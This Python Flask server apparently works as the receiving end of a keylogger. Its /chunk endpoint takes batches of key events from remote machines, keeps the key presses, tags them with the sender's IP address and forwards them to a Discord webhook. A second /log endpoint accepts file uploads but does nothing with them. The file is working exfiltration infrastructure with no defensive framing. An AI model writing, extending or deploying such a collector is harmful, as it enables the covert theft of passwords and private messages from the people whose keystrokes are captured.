import json
import itertools
import os
from typing import Any, Literal

import requests
from flask import Flask, request

URL_DISCORD_WEBHOOK_API = "https://discord.com/api/webhooks/{id}/{token}"
WEBHOOK_ID = os.environ["WEBHOOK_ID"]
WEBHOOK_TOKEN = os.environ["WEBHOOK_TOKEN"]

app = Flask(__name__)


def save(data: str) -> None:
    url = URL_DISCORD_WEBHOOK_API.format(
        id=WEBHOOK_ID,
        token=WEBHOOK_TOKEN,
    )

    body = {
        "content": data,
    }

    response = requests.post(url, json=body)
    response.raise_for_status()

    assert response.status_code == 204


@app.route("/log", methods=("POST",))  # type: ignore
def log():
    file = request.files["file"]
    file

    return ''


@app.route("/chunk", methods=("POST",))  # type: ignore
def chunk():
    data: list[tuple[int, str, Literal[0, 1], int]]
    data = request.json  # type: ignore

    ip_address: str = request.remote_addr  # type: ignore

    downs = filter(lambda x: not x[2], data)
    keys = map(lambda log: log[1], downs)

    message = ip_address + '\n'
    message += ' '.join(keys)

    save(message)

    return ''


app.run()
